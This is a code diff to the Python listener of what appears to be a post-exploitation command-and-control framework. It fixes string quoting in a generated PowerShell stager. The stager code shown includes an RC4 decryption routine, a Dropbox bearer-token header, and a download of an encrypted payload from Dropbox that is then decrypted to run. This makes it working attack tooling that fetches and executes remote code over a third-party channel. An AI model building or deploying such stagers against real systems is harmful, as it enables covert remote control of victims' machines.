@@ -261,7 +261,7 @@ class Listener(object):
                 # TODO: reimplement stager retries?
 
                 # code to turn the key string into a byte array
-                stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes({ staging_key });"
+                stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
 
                 # this is the minimized RC4 stager code from rc4.ps1
                 stager += "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
@@ -269,7 +269,7 @@ class Listener(object):
                 # add in the Dropbox auth token and API params
                 stager += f"$t='{ api_token }';"
                 stager += '$wc.Headers.Add("Authorization","Bearer $t");'
-                stager += f'$wc.Headers.Add("Dropbox-API-Arg",\'{"path":"{ staging_folder }/debugps"}\');'
+                stager += f'$wc.Headers.Add("Dropbox-API-Arg",\'{{"path":"{ staging_folder }/debugps"}}\');'
 
                 stager += "$data=$wc.DownloadData('https://content.dropboxapi.com/2/files/download');"
                 stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
